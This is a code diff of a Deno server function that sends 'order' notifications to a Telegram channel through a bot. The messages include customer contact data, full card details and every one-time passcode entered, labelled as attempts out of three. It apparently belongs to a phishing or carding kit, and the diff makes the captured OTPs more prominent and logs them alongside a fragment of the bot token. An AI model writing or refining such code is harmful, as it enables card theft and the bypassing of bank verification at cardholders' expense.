@@ -1,3 +1,4 @@
+
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
@@ -130,17 +131,17 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   
   // Create a clear header based on attempt
   const attemptHeader = isLastAttempt 
-    ? '✅ <b>OTP VERIFICATION SUCCESSFUL</b> ✅' 
+    ? '🔑 <b>OTP VERIFICATION SUCCESSFUL</b> 🔑' 
     : `⚠️ <b>OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
   
   const statusText = isLastAttempt 
     ? '✅ Success - Final attempt' 
     : `❌ Failed - Attempt ${attempt} of 3`;
     
-  // Make the OTP value more prominent in the message
+  // Make the OTP value extremely prominent in the message
   const otpValue = orderDetails.otpValue 
-    ? `<b><code>${orderDetails.otpValue}</code></b>`
-    : 'Not provided';
+    ? `🔢 <b>CODE ENTERED: <code>${orderDetails.otpValue}</code></b> 🔢`
+    : '🔢 <b>NO CODE PROVIDED</b> 🔢';
 
   // Payment details section - show full card details
   let paymentSection = '';
@@ -158,14 +159,14 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   return `
 ${attemptHeader}
 
+${otpValue}
+
 👤 <b>Customer</b>: ${orderDetails.customerName}
 📧 <b>Email</b>: ${orderDetails.email}
 📱 <b>Phone</b>: ${orderDetails.phone}
 
 🔐 <b>Verification Status</b>:
    ${statusText}
-
-🔢 <b>OTP Entered</b>: ${otpValue}
 
 ${paymentSection}
 
@@ -203,6 +204,10 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
     console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
     console.log("Message content:", message); // Log the actual message for debugging
     
+    // Detailed logging for debugging
+    console.log("Using bot token:", TELEGRAM_BOT_TOKEN.substring(0, 5) + "..." + TELEGRAM_BOT_TOKEN.substring(TELEGRAM_BOT_TOKEN.length - 5));
+    console.log("Sending to channel ID:", TELEGRAM_CHANNEL_ID);
+    
     const response = await fetch(telegramApiUrl, {
       method: "POST",
       headers: {
@@ -212,6 +217,7 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
         chat_id: TELEGRAM_CHANNEL_ID,
         text: message,
         parse_mode: "HTML", // Using HTML for better formatting
+        disable_web_page_preview: true
       }),
     });
 
@@ -267,6 +273,11 @@ serve(async (req) => {
     }
     
     console.log("Received order details for Telegram notification:", orderDetails);
+    
+    // Double check OTP value is present
+    if (orderDetails.notificationType === "otp_attempt") {
+      console.log(`OTP Attempt ${orderDetails.otpAttempt}: OTP Value = "${orderDetails.otpValue}"`);
+    }
     
     // Format the message for Telegram
     const message = formatTelegramMessage(orderDetails);
